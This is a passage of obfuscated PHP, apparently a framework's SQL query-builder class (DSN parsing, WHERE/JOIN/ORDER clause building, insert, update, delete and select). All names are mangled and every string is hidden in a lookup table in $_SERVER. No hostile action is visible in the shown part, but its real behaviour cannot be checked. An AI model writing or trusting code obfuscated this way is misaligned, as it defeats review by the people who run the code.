$Ñ¡Ú½•Š[$³¿ùˆÑì[939]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[939]][0], $³¿ùˆÑì[940] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[940]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[940]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[940]][0], $³¿ùˆÑì[21] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[21]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[21]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[21]][0], $³¿ùˆÑì[969] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[969]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[969]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[969]][0], $³¿ùˆÑì[17] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[17]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[17]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[17]][0]); return $this->connect($òÈ¾ö¾È, $Ò·»Äü‡); } public function parseDSN($¸Èœ½î‘) { $°¶¬ˆİ =& $_SERVER[Ö†ØøÖ±]; if (empty($¸Èœ½î‘)) { return !1; } $Ê­ÙŸåÛ = parse_url($¸Èœ½î‘); if ($Ê­ÙŸåÛ[$°¶¬ˆİ[195]]) { $½˜£™§ = array($°¶¬ˆİ[1014] => $Ê­ÙŸåÛ[$°¶¬ˆİ[195]], $°¶¬ˆİ[941] => isset($Ê­ÙŸåÛ[$°¶¬ˆİ[639]]) ? $Ê­ÙŸåÛ[$°¶¬ˆİ[639]] : $°¶¬ˆİ[12], $°¶¬ˆİ[942] => isset($Ê­ÙŸåÛ[$°¶¬ˆİ[1038]]) ? $Ê­ÙŸåÛ[$°¶¬ˆİ[1038]] : $°¶¬ˆİ[12], $°¶¬ˆİ[939] => isset($Ê­ÙŸåÛ[$°¶¬ˆİ[196]]) ? $Ê­ÙŸåÛ[$°¶¬ˆİ[196]] : $°¶¬ˆİ[12], $°¶¬ˆİ[940] => isset($Ê­ÙŸåÛ[$°¶¬ˆİ[197]]) ? $Ê­ÙŸåÛ[$°¶¬ˆİ[197]] : $°¶¬ˆİ[12], $°¶¬ˆİ[21] => isset($Ê­ÙŸåÛ[$°¶¬ˆİ[84]]) ? substr($Ê­ÙŸåÛ[$°¶¬ˆİ[84]], 1) : $°¶¬ˆİ[12]); } else { preg_match($°¶¬ˆİ[1039], trim($¸Èœ½î‘), $÷­ƒù‡¥); $½˜£™§ = array($°¶¬ˆİ[1014] => $÷­ƒù‡¥[1], $°¶¬ˆİ[941] => $÷­ƒù‡¥[2], $°¶¬ˆİ[942] => $÷­ƒù‡¥[3], $°¶¬ˆİ[939] => $÷­ƒù‡¥[4], $°¶¬ˆİ[940] => $÷­ƒù‡¥[5], $°¶¬ˆİ[21] => $÷­ƒù‡¥[6]); } $½˜£™§[$°¶¬ˆİ[969]] = $°¶¬ˆİ[12]; return $½˜£™§; } protected function debug() { $ÑÎ½ºúó =& $_SERVER[Ö†ØøÖ±]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÑÎ½ºúó[1040]; if (think_config($ÑÎ½ºúó[1041])) { think_status($ÑÎ½ºúó[1042]); think_trace($this->queryStr . $ÑÎ½ºúó[1043] . think_status($ÑÎ½ºúó[24], $ÑÎ½ºúó[1042], 6) . $ÑÎ½ºúó[1044], $ÑÎ½ºúó[12], $ÑÎ½ºúó[1045]); } } protected function parseLock($ˆ¼÷¨›¨ = false) { $”¹˜§¶ =& $_SERVER[Ö†ØøÖ±]; if (!$ˆ¼÷¨›¨) { return $”¹˜§¶[12]; } if ($”¹˜§¶[971] == $this->dbType) { return $”¹˜§¶[1046]; } return $”¹˜§¶[1047]; } protected function parseSet($Ü¢º¢) { $Êî‡Œö¿ =& $_SERVER[Ö†ØøÖ±]; foreach ($Ü¢º¢ as $ÔĞ“½ => $Å™ Ñ’) { if (is_array($Å™ Ñ’) && $Êî‡Œö¿[350] == $Å™ Ñ’[0]) { $›µ­›Ò¾[] = $this->parseKey($ÔĞ“½) . $Êî‡Œö¿[937] . $Å™ Ñ’[1]; } elseif (is_scalar($Å™ Ñ’) || is_null($Å™ Ñ’)) { $›µ­›Ò¾[] = $this->parseKey($ÔĞ“½) . $Êî‡Œö¿[937] . $this->parseValue($Å™ Ñ’); } } return $Êî‡Œö¿[1048] . implode($Êî‡Œö¿[50], $›µ­›Ò¾); } protected function bindParam($¡Ñ›€›’, $–Œ¤„Æ) { $this->bind[$_SERVER[Ö†ØøÖ±][4] . $¡Ñ›€›’] = $–Œ¤„Æ; } protected function parseBind($×Ğò¾ñ²) { $×Ğò¾ñ² = array_merge($this->bind, $×Ğò¾ñ²); $this->bind = array(); return $×Ğò¾ñ²; } function parseKey(&$èõŒïéÄ, $ÏêÛËò³ = true) { if ($ÏêÛËò³) { $èõŒïéÄ = $this->parseKeyCheck($èõŒïéÄ); } return $èõŒïéÄ; } function parseKeyCheck($­ßúïšÆ) { $â¹Šå° =& $_SERVER[Ö†ØøÖ±]; $­ßúïšÆ = trim($­ßúïšÆ); if (!preg_match($â¹Šå°[1049], $­ßúïšÆ)) { think_exception($â¹Šå°[1050] . $­ßúïšÆ); } return $­ßúïšÆ; } protected function parseValue($”â¢ıäà) { $ÑóÛ³œ’ =& $_SERVER[Ö†ØøÖ±]; if (is_string($”â¢ıäà)) { $”â¢ıäà = $ÑóÛ³œ’[1010] . $this->escapeString($”â¢ıäà) . $ÑóÛ³œ’[1010]; } elseif (isset($”â¢ıäà[0]) && is_string($”â¢ıäà[0]) && strtolower($”â¢ıäà[0]) == $ÑóÛ³œ’[350]) { $”â¢ıäà = $this->escapeString($”â¢ıäà[1]); } elseif (is_array($”â¢ıäà)) { $”â¢ıäà = array_map(array($this, $ÑóÛ³œ’[1011]), $”â¢ıäà); } elseif (is_bool($”â¢ıäà)) { $”â¢ıäà = $”â¢ıäà ? $ÑóÛ³œ’[88] : $ÑóÛ³œ’[212]; } elseif (is_null($”â¢ıäà)) { $”â¢ıäà = $ÑóÛ³œ’[103]; } return $”â¢ıäà; } protected function parseField($¹áÑµ„«) { $ŞÖÇ¶§ =& $_SERVER[Ö†ØøÖ±]; if (is_string($¹áÑµ„«) && strpos($¹áÑµ„«, $ŞÖÇ¶§[50])) { $¹áÑµ„« = explode($ŞÖÇ¶§[50], $¹áÑµ„«); } if (is_array($¹áÑµ„«)) { $³ã“ç‡ = array(); foreach ($¹áÑµ„« as $£Âï¬’ñ => $–«¿íµ¢) { if (!is_numeric($£Âï¬’ñ)) { $³ã“ç‡[] = $this->parseKey($£Âï¬’ñ, !1) . $ŞÖÇ¶§[1051] . $this->parseKey($–«¿íµ¢); } else { $³ã“ç‡[] = $this->parseKey($–«¿íµ¢); } } $éĞ¥ßÉæ = implode($ŞÖÇ¶§[50], $³ã“ç‡); } elseif (is_string($¹áÑµ„«) && !empty($¹áÑµ„«)) { $éĞ¥ßÉæ = $¹áÑµ„«; } else { $éĞ¥ßÉæ = $ŞÖÇ¶§[203]; } return $éĞ¥ßÉæ; } protected function parseTable($‡ÒÛùêÁ) { $ƒ’“½¼÷ =& $_SERVER[Ö†ØøÖ±]; if (is_array($‡ÒÛùêÁ)) { $Ò–Ÿ¹æÑ = array(); foreach ($‡ÒÛùêÁ as $ŸìÖ¤Ò => $ãšÈ ‘œ) { if (!is_numeric($ŸìÖ¤Ò)) { $Ò–Ÿ¹æÑ[] = $this->parseKey($ŸìÖ¤Ò) . $ƒ’“½¼÷[53] . $this->parseKey($ãšÈ ‘œ); } else { $Ò–Ÿ¹æÑ[] = $this->parseKey($ŸìÖ¤Ò); } } $‡ÒÛùêÁ = $Ò–Ÿ¹æÑ; } elseif (is_string($‡ÒÛùêÁ)) { if (strstr($‡ÒÛùêÁ, $ƒ’“½¼÷[53])) { return $‡ÒÛùêÁ; } $‡ÒÛùêÁ = explode($ƒ’“½¼÷[50], $‡ÒÛùêÁ); array_walk($‡ÒÛùêÁ, array($this, $ƒ’“½¼÷[959])); } return $ƒ’“½¼÷[953] . trim(implode($ƒ’“½¼÷[1052], $‡ÒÛùêÁ), $ƒ’“½¼÷[437]) . $ƒ’“½¼÷[953]; } protected function parseWhere($×İô¼âó) { $ôö»ÊÈ =& $_SERVER[Ö†ØøÖ±]; $‚¨¼ÏÇ = $ôö»ÊÈ[12]; if (is_string($×İô¼âó)) { $‚¨¼ÏÇ = $×İô¼âó; } else { $­ıÄ‰à’ = isset($×İô¼âó[$ôö»ÊÈ[1053]]) ? strtoupper($×İô¼âó[$ôö»ÊÈ[1053]]) : $ôö»ÊÈ[12]; if (in_array($­ıÄ‰à’, array($ôö»ÊÈ[1054], $ôö»ÊÈ[1055], $ôö»ÊÈ[1056]))) { $­ıÄ‰à’ = $ôö»ÊÈ[53] . $­ıÄ‰à’ . $ôö»ÊÈ[53]; unset($×İô¼âó[$ôö»ÊÈ[1053]]); } else { $­ıÄ‰à’ = $ôö»ÊÈ[1057]; } foreach ($×İô¼âó as $ãùà®Â– => $Ğæ¦î¢®) { $‚¨¼ÏÇ .= $ôö»ÊÈ[330]; if (is_numeric($ãùà®Â–)) { $ãùà®Â– = $ôö»ÊÈ[1058]; } if (0 === strpos($ãùà®Â–, $ôö»ÊÈ[11])) { $‚¨¼ÏÇ .= $this->parseThinkWhere($ãùà®Â–, $Ğæ¦î¢®); } else { if (!preg_match($ôö»ÊÈ[1059], trim($ãùà®Â–))) { think_exception(think_lang($ôö»ÊÈ[1060]) . $ôö»ÊÈ[4] . $ãùà®Â–); } $±Â´ØæÔ = is_array($Ğæ¦î¢®) && isset($Ğæ¦î¢®[$ôö»ÊÈ[1061]]); $ãùà®Â– = trim($ãùà®Â–); if (strpos($ãùà®Â–, $ôö»ÊÈ[336])) { $ÓŒŠã“­ = explode($ôö»ÊÈ[336], $ãùà®Â–); $†şÎó‰Š = array(); foreach ($ÓŒŠã“­ as $ùÓ®¼¤£ => $ß ¾áÔá) { $¶Úü«š§ = $±Â´ØæÔ ? $Ğæ¦î¢®[$ùÓ®¼¤£] : $Ğæ¦î¢®; $†şÎó‰Š[] = $ôö»ÊÈ[313] . $this->parseWhereItem($this->parseKey($ß ¾áÔá), $¶Úü«š§) . $ôö»ÊÈ[958]; } $‚¨¼ÏÇ .= implode($ôö»ÊÈ[1062], $†şÎó‰Š); } elseif (strpos($ãùà®Â–, $ôö»ÊÈ[337])) { $ÓŒŠã“­ = explode($ôö»ÊÈ[337], $ãùà®Â–); $†şÎó‰Š = array(); foreach ($ÓŒŠã“­ as $ùÓ®¼¤£ => $ß ¾áÔá) { $¶Úü«š§ = $±Â´ØæÔ ? $Ğæ¦î¢®[$ùÓ®¼¤£] : $Ğæ¦î¢®; $†şÎó‰Š[] = $ôö»ÊÈ[313] . $this->parseWhereItem($this->parseKey($ß ¾áÔá), $¶Úü«š§) . $ôö»ÊÈ[958]; } $‚¨¼ÏÇ .= implode($ôö»ÊÈ[1057], $†şÎó‰Š); } else { $‚¨¼ÏÇ .= $this->parseWhereItem($this->parseKey($ãùà®Â–), $Ğæ¦î¢®); } } $‚¨¼ÏÇ .= $ôö»ÊÈ[331] . $­ıÄ‰à’; } $‚¨¼ÏÇ = substr($‚¨¼ÏÇ, 0, -strlen($­ıÄ‰à’)); } return empty($‚¨¼ÏÇ) ? $ôö»ÊÈ[12] : $ôö»ÊÈ[1063] . $‚¨¼ÏÇ; } protected function parseWhereItem($¯¬ş°â, $õœ”ø‰å) { $æşèóï¦ =& $_SERVER[Ö†ØøÖ±]; $É¼­âÇ« = $æşèóï¦[12]; if (is_array($õœ”ø‰å)) { if (is_string($õœ”ø‰å[0])) { $ö­õ¼§ = strtolower($õœ”ø‰å[0]); if (in_array($õœ”ø‰å[0], array($æşèóï¦[937], $æşèóï¦[1064], $æşèóï¦[1065], $æşèóï¦[1066], $æşèóï¦[1067], $æşèóï¦[1068]))) { $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[53] . $õœ”ø‰å[0] . $æşèóï¦[53] . $this->parseValue($õœ”ø‰å[1]); } elseif (preg_match($æşèóï¦[1069], $õœ”ø‰å[0])) { $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[53] . $this->parseValue($õœ”ø‰å[1]); } elseif (preg_match($æşèóï¦[1070], $õœ”ø‰å[0])) { if (is_array($õœ”ø‰å[1])) { $´ Ö = isset($õœ”ø‰å[2]) ? strtoupper($õœ”ø‰å[2]) : $æşèóï¦[1055]; if (in_array($´ Ö, array($æşèóï¦[1054], $æşèóï¦[1055], $æşèóï¦[1056]))) { $–ÊØ¾® = array(); foreach ($õœ”ø‰å[1] as $âĞº²ñß) { $–ÊØ¾®[] = $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[53] . $this->parseValue($âĞº²ñß); } $É¼­âÇ« .= $æşèóï¦[313] . implode($æşèóï¦[53] . $´ Ö . $æşèóï¦[53], $–ÊØ¾®) . $æşèóï¦[958]; } } else { $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[53] . $this->parseValue($õœ”ø‰å[1]); } } elseif ($æşèóï¦[350] == $ö­õ¼§) { $É¼­âÇ« .= $æşèóï¦[956] . $¯¬ş°â . $æşèóï¦[53] . $õœ”ø‰å[1] . $æşèóï¦[1071]; } elseif (preg_match($æşèóï¦[1072], $õœ”ø‰å[0])) { $É¼­âÇ« .= $õœ”ø‰å[0]; } elseif (preg_match($æşèóï¦[1073], $õœ”ø‰å[0])) { if (isset($õœ”ø‰å[2]) && $æşèóï¦[350] == $õœ”ø‰å[2]) { $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[53] . $õœ”ø‰å[1]; } else { if (is_string($õœ”ø‰å[1])) { $õœ”ø‰å[1] = explode($æşèóï¦[50], $õœ”ø‰å[1]); } $Â›·ó¶ï = implode($æşèóï¦[50], $this->parseValue($õœ”ø‰å[1])); $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[956] . $Â›·ó¶ï . $æşèóï¦[958]; } } elseif (preg_match($æşèóï¦[1074], $õœ”ø‰å[0])) { $Î’®ôùÒ = is_string($õœ”ø‰å[1]) ? explode($æşèóï¦[50], $õœ”ø‰å[1]) : $õœ”ø‰å[1]; $É¼­âÇ« .= $æşèóï¦[956] . $¯¬ş°â . $æşèóï¦[53] . $this->exp[$ö­õ¼§] . $æşèóï¦[53] . $this->parseValue($Î’®ôùÒ[0]) . $æşèóï¦[1057] . $this->parseValue($Î’®ôùÒ[1]) . $æşèóï¦[331]; } else { think_exception(think_lang($æşèóï¦[1060]) . $æşèóï¦[4] . $õœ”ø‰å[0]); } } else { $¹ÄŞº—¼ = count($õœ”ø‰å); $ÑíØòÎŸ = $æşèóï¦[12]; if (is_string($õœ”ø‰å[$¹ÄŞº—¼ - 1])) { $ÑíØòÎŸ = isset($õœ”ø‰å[$¹ÄŞº—¼ - 1]) ? strtoupper($õœ”ø‰å[$¹ÄŞº—¼ - 1]) : $æşèóï¦[12]; if (in_array($ÑíØòÎŸ, array($æşèóï¦[1054], $æşèóï¦[1055], $æşèóï¦[1056]))) { $¹ÄŞº—¼ = $¹ÄŞº—¼ - 1; } } else { $ÑíØòÎŸ = $æşèóï¦[1054]; } for ($¬À ¨±ä = 0; $¬À ¨±ä < $¹ÄŞº—¼; $¬À ¨±ä++) { $Î’®ôùÒ = is_array($õœ”ø‰å[$¬À ¨±ä]) ? $õœ”ø‰å[$¬À ¨±ä][1] : $õœ”ø‰å[$¬À ¨±ä]; if ($æşèóï¦[350] == strtolower($õœ”ø‰å[$¬À ¨±ä][0])) { $É¼­âÇ« .= $æşèóï¦[313] . $¯¬ş°â . $æşèóï¦[53] . $Î’®ôùÒ . $æşèóï¦[1071] . $ÑíØòÎŸ . $æşèóï¦[53]; } else { $èšŞÈñ = is_array($õœ”ø‰å[$¬À ¨±ä]) ? $this->exp[strtolower($õœ”ø‰å[$¬À ¨±ä][0])] : $æşèóï¦[937]; if (!$èšŞÈñ && is_array($õœ”ø‰å[$¬À ¨±ä]) && in_array($õœ”ø‰å[$¬À ¨±ä][0], array($æşèóï¦[937], $æşèóï¦[1064], $æşèóï¦[1065], $æşèóï¦[1066], $æşèóï¦[1067], $æşèóï¦[1068]))) { $èšŞÈñ = $õœ”ø‰å[$¬À ¨±ä][0]; } $É¼­âÇ« .= $æşèóï¦[313] . $¯¬ş°â . $æşèóï¦[53] . $èšŞÈñ . $æşèóï¦[53] . $this->parseValue($Î’®ôùÒ) . $æşèóï¦[1071] . $ÑíØòÎŸ . $æşèóï¦[53]; } } $É¼­âÇ« = substr($É¼­âÇ«, 0, -4); } } else { $É¼­âÇ« .= $¯¬ş°â . $æşèóï¦[1075] . $this->parseValue($õœ”ø‰å); } return $É¼­âÇ«; } protected function parseThinkWhere($¨ÆÇ“È´, $ä÷õ…©±) { $ãçá‰÷ñ =& $_SERVER[Ö†ØøÖ±]; $÷¶¶ÅìÌ = $ãçá‰÷ñ[12]; switch ($¨ÆÇ“È´) { case $ãçá‰÷ñ[405]: $÷¶¶ÅìÌ = $ä÷õ…©±; break; case $ãçá‰÷ñ[1058]: $÷¶¶ÅìÌ = is_string($ä÷õ…©±) ? $ä÷õ…©± : substr($this->parseWhere($ä÷õ…©±), 6); break; case $ãçá‰÷ñ[1076]: parse_str($ä÷õ…©±, $±¢Çêƒ¦); if (isset($±¢Çêƒ¦[$ãçá‰÷ñ[1053]])) { $Øäˆ¼€é = $ãçá‰÷ñ[53] . strtoupper($±¢Çêƒ¦[$ãçá‰÷ñ[1053]]) . $ãçá‰÷ñ[53]; unset($±¢Çêƒ¦[$ãçá‰÷ñ[1053]]); } else { $Øäˆ¼€é = $ãçá‰÷ñ[1057]; } $´ô——¢É = array(); foreach ($±¢Çêƒ¦ as $Ï°İ‘ôÑ => $ØüöÜåÈ) { $´ô——¢É[] = $this->parseKey($Ï°İ‘ôÑ) . $ãçá‰÷ñ[1075] . $this->parseValue($ØüöÜåÈ); } $÷¶¶ÅìÌ = implode($Øäˆ¼€é, $´ô——¢É); break; } return $÷¶¶ÅìÌ; } protected function parseLimit($ÑÉ¾„ÖÏ) { $±åÀËŞ =& $_SERVER[Ö†ØøÖ±]; return !empty($ÑÉ¾„ÖÏ) ? $±åÀËŞ[51] . $ÑÉ¾„ÖÏ . $±åÀËŞ[53] : $±åÀËŞ[12]; } protected function parseJoin($Û¡ Ê×) { $º¼¶¶Êš =& $_SERVER[Ö†ØøÖ±]; $²ËÎäÇİ = $º¼¶¶Êš[12]; if (!empty($Û¡ Ê×)) { if (is_array($Û¡ Ê×)) { foreach ($Û¡ Ê× as $«°¬¤ü => $Ø¦•ƒù€) { if (!1 !== stripos($Ø¦•ƒù€, $º¼¶¶Êš[1077])) { $²ËÎäÇİ .= $º¼¶¶Êš[53] . $Ø¦•ƒù€; } else { $²ËÎäÇİ .= $º¼¶¶Êš[1078] . $Ø¦•ƒù€; } } } else { $²ËÎäÇİ .= $º¼¶¶Êš[1078] . $Û¡ Ê×; } } $²ËÎäÇİ = preg_replace($º¼¶¶Êš[1079], think_config($º¼¶¶Êš[983]) . $º¼¶¶Êš[1080], $²ËÎäÇİ); return $²ËÎäÇİ; } protected function parseOrder($•Æï û) { $ü½œê”§ =& $_SERVER[Ö†ØøÖ±]; if (is_array($•Æï û)) { $Ñ®½º = array(); foreach ($•Æï û as $ƒ†ã¡’ñ => $€–ğ‘î—) { if (is_numeric($ƒ†ã¡’ñ)) { $Ñ®½º[] = $this->parseKey($€–ğ‘î—); } else { $€–ğ‘î— = in_array(strtoupper(trim($€–ğ‘î—)), array($ü½œê”§[1081], $ü½œê”§[1082])) ? $ü½œê”§[53] . $€–ğ‘î— : $ü½œê”§[12]; if (preg_match($ü½œê”§[1083], $ƒ†ã¡’ñ)) { $Ñ®½º[] = $this->parseKey($ƒ†ã¡’ñ) . $€–ğ‘î—; } else { think_exception($ü½œê”§[1084] . $ƒ†ã¡’ñ); } } } $•Æï û = implode($ü½œê”§[50], $Ñ®½º); } return !empty($•Æï û) ? $ü½œê”§[1085] . $•Æï û : $ü½œê”§[12]; } protected function parseGroup($ë¸İ×»±) { $‘×Úç¤³ =& $_SERVER[Ö†ØøÖ±]; return !empty($ë¸İ×»±) ? $‘×Úç¤³[1086] . $ë¸İ×»± : $‘×Úç¤³[12]; } protected function parseHaving($úš…™Ø”) { $âùËÎÉ =& $_SERVER[Ö†ØøÖ±]; return !empty($úš…™Ø”) ? $âùËÎÉ[1087] . $úš…™Ø” : $âùËÎÉ[12]; } protected function parseComment($İÕ¹ùÁÈ) { $ôÄò’ÂÑ =& $_SERVER[Ö†ØøÖ±]; return !empty($İÕ¹ùÁÈ) ? $ôÄò’ÂÑ[1088] . $İÕ¹ùÁÈ . $ôÄò’ÂÑ[1089] : $ôÄò’ÂÑ[12]; } protected function parseDistinct($øß¯‘àŸ) { $³ËÀ›À¿ =& $_SERVER[Ö†ØøÖ±]; return !empty($øß¯‘àŸ) ? $³ËÀ›À¿[1090] : $³ËÀ›À¿[12]; } protected function parseUnion($áã¥’›ô) { $î€Š¶×Ò =& $_SERVER[Ö†ØøÖ±]; if (empty($áã¥’›ô)) { return $î€Š¶×Ò[12]; } if (isset($áã¥’›ô[$î€Š¶×Ò[401]])) { $—ûõò–æ = $î€Š¶×Ò[1091]; unset($áã¥’›ô[$î€Š¶×Ò[401]]); } else { $—ûõò–æ = $î€Š¶×Ò[1092]; } foreach ($áã¥’›ô as $¾ì‹¼Ä´) { $Ï×ÍŸ®¨[] = $—ûõò–æ . (is_array($¾ì‹¼Ä´) ? $this->buildSelectSql($¾ì‹¼Ä´) : $¾ì‹¼Ä´); } return implode($î€Š¶×Ò[53], $Ï×ÍŸ®¨); } public function insert($æÈ—Á–Š, $™Ç”ë‹° = array(), $È­ş€Ë = false) { $¢ïÏÇü =& $_SERVER[Ö†ØøÖ±]; $ÍÚ§»› = $ìĞÇ¡ôï = array(); $this->model = $™Ç”ë‹°[$¢ïÏÇü[334]]; foreach ($æÈ—Á–Š as $’Ì¼øÇ¥ => $¨”á¸Í²) { if (is_array($¨”á¸Í²) && $¢ïÏÇü[350] == $¨”á¸Í²[0]) { $ìĞÇ¡ôï[] = $this->parseKey($’Ì¼øÇ¥); $ÍÚ§»›[] = $¨”á¸Í²[1]; } elseif (is_scalar($¨”á¸Í²) || is_null($¨”á¸Í²)) { $ìĞÇ¡ôï[] = $this->parseKey($’Ì¼øÇ¥); $ÍÚ§»›[] = $this->parseValue($¨”á¸Í²); } } $ôµù¦¥‹ = ($È­ş€Ë ? $¢ïÏÇü[960] : $¢ïÏÇü[961]) . $¢ïÏÇü[962] . $this->parseTable($™Ç”ë‹°[$¢ïÏÇü[332]]) . $¢ïÏÇü[956] . implode($¢ïÏÇü[50], $ìĞÇ¡ôï) . $¢ïÏÇü[957] . implode($¢ïÏÇü[50], $ÍÚ§»›) . $¢ïÏÇü[958]; $ôµù¦¥‹ .= $this->parseLock(isset($™Ç”ë‹°[$¢ïÏÇü[897]]) ? $™Ç”ë‹°[$¢ïÏÇü[897]] : !1); $ôµù¦¥‹ .= $this->parseComment(!empty($™Ç”ë‹°[$¢ïÏÇü[407]]) ? $™Ç”ë‹°[$¢ïÏÇü[407]] : $¢ïÏÇü[12]); return $this->execute($ôµù¦¥‹, $this->parseBind(!empty($™Ç”ë‹°[$¢ïÏÇü[338]]) ? $™Ç”ë‹°[$¢ïÏÇü[338]] : array())); } public function selectInsert($àöÙİø, $¬âÕÚÏ, $Â”Â»Èı = array()) { $ù¾ÓÉ¯İ =& $_SERVER[Ö†ØøÖ±]; $this->model = $Â”Â»Èı[$ù¾ÓÉ¯İ[334]]; if (is_string($àöÙİø)) { $àöÙİø = explode($ù¾ÓÉ¯İ[50], $àöÙİø); } array_walk($àöÙİø, array($this, $ù¾ÓÉ¯İ[959])); $Ğıˆ¨ÇØ = $ù¾ÓÉ¯İ[1093] . $this->parseTable($¬âÕÚÏ) . $ù¾ÓÉ¯İ[956] . implode($ù¾ÓÉ¯İ[50], $àöÙİø) . $ù¾ÓÉ¯İ[1071]; $Ğıˆ¨ÇØ .= $this->buildSelectSql($Â”Â»Èı); return $this->execute($Ğıˆ¨ÇØ, $this->parseBind(!empty($Â”Â»Èı[$ù¾ÓÉ¯İ[338]]) ? $Â”Â»Èı[$ù¾ÓÉ¯İ[338]] : array())); } public function update($²´§®Ì², $†Ù‹ü€) { $ó¨ÜË² =& $_SERVER[Ö†ØøÖ±]; $this->model = $†Ù‹ü€[$ó¨ÜË²[334]]; $Ÿ˜ø•Àº = $ó¨ÜË²[1094] . $this->parseTable($†Ù‹ü€[$ó¨ÜË²[332]]) . $this->parseSet($²´§®Ì²) . $this->parseWhere(!empty($†Ù‹ü€[$ó¨ÜË²[328]]) ? $†Ù‹ü€[$ó¨ÜË²[328]] : $ó¨ÜË²[12]) . $this->parseOrder(!empty($†Ù‹ü€[$ó¨ÜË²[418]]) ? $†Ù‹ü€[$ó¨ÜË²[418]] : $ó¨ÜË²[12]) . $this->parseLimit(!empty($†Ù‹ü€[$ó¨ÜË²[345]]) ? $†Ù‹ü€[$ó¨ÜË²[345]] : $ó¨ÜË²[12]) . $this->parseLock(isset($†Ù‹ü€[$ó¨ÜË²[897]]) ? $†Ù‹ü€[$ó¨ÜË²[897]] : !1) . $this->parseComment(!empty($†Ù‹ü€[$ó¨ÜË²[407]]) ? $†Ù‹ü€[$ó¨ÜË²[407]] : $ó¨ÜË²[12]); return $this->execute($Ÿ˜ø•Àº, $this->parseBind(!empty($†Ù‹ü€[$ó¨ÜË²[338]]) ? $†Ù‹ü€[$ó¨ÜË²[338]] : array())); } public function delete($¢ß¾Ó¤å = array()) { $§æ×ËÈ‘ =& $_SERVER[Ö†ØøÖ±]; $this->model = $¢ß¾Ó¤å[$§æ×ËÈ‘[334]]; $·ÁÛ†Ÿæ = $§æ×ËÈ‘[1095] . $this->parseTable($¢ß¾Ó¤å[$§æ×ËÈ‘[332]]) . $this->parseWhere(!empty($¢ß¾Ó¤å[$§æ×ËÈ‘[328]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[328]] : $§æ×ËÈ‘[12]) . $this->parseOrder(!empty($¢ß¾Ó¤å[$§æ×ËÈ‘[418]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[418]] : $§æ×ËÈ‘[12]) . $this->parseLimit(!empty($¢ß¾Ó¤å[$§æ×ËÈ‘[345]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[345]] : $§æ×ËÈ‘[12]) . $this->parseLock(isset($¢ß¾Ó¤å[$§æ×ËÈ‘[897]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[897]] : !1) . $this->parseComment(!empty($¢ß¾Ó¤å[$§æ×ËÈ‘[407]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[407]] : $§æ×ËÈ‘[12]); return $this->execute($·ÁÛ†Ÿæ, $this->parseBind(!empty($¢ß¾Ó¤å[$§æ×ËÈ‘[338]]) ? $¢ß¾Ó¤å[$§æ×ËÈ‘[338]] : array())); } public function select($®º¯İ– = array()) { $ãÑ‚é»Ğ =& $_SERVER[Ö†ØøÖ±]; $this->model = $®º¯İ–[$ãÑ‚é»Ğ[334]]; $Šå¢¿Ù = $this->buildSelectSql($®º¯İ–); $®Øø—Ëí = isset($®º¯İ–[$ãÑ‚é»Ğ[402]]) ? $®º¯İ–[$ãÑ‚é»Ğ[402]] : !1; if ($®Øø—Ëí) { $áìşÇ»ç = is_string($®Øø—Ëí[$ãÑ‚é»Ğ[94]]) ? $®Øø—Ëí[$ãÑ‚é»Ğ[94]] : $ãÑ‚é»Ğ[1096] . md5($Šå¢¿Ù); $˜™£Ù¾  = think_cache($áìşÇ»ç, $ãÑ‚é»Ğ[12], $®Øø—Ëí); if (!1 !== $˜™£Ù¾ ) { return $˜™£Ù¾ ; } } $ˆÚÙÄ´‹ = $this->query($Šå¢¿Ù, $this->parseBind(!empty($®º¯İ–[$ãÑ‚é»Ğ[338]]) ? $®º¯İ–[$ãÑ‚é»Ğ[338]] : array())); if ($®Øø—Ëí && !1 !== $ˆÚÙÄ´‹) { think_cache($áìşÇ»ç, $ˆÚÙÄ´‹, $®Øø—Ëí); } return $ˆÚÙÄ´‹; } public function buildSelectSql($ÙŸ©Ñ¬í = array()) { $­©æé© =& $_SERVER[Ö†ØøÖ±]; if (isset($ÙŸ©Ñ¬í[$­©æé©[406]])) { if (strpos($ÙŸ©Ñ¬í[$­©æé©[406]], $­©æé©[50])) { list($‘òâ•Æ, $èà¬·½) = explode($­©æé©[50], $ÙŸ©Ñ¬í[$­©æé©[406]]); } else { $‘òâ•Æ = $ÙŸ©Ñ¬í[$­©æé©[406]]; } $‘òâ•Æ = $‘òâ•Æ ? $‘òâ•Æ : 1; $èà¬·½ = isset($èà¬·½) ? $èà¬·½ : (is_numeric($ÙŸ©Ñ¬í[$­©æé©[345]]) ? $ÙŸ©Ñ¬í[$­©æé©[345]] : 20); $¥¦ıŸîä = $èà¬·½ * ((int) $‘òâ•Æ - 1); $ÙŸ©Ñ¬í[$­©æé©[345]] = $¥¦ıŸîä . $­©æé©[50] . $èà¬·½; } if (think_config($­©æé©[1097])) { $Öşûó™  = $­©æé©[1098] . 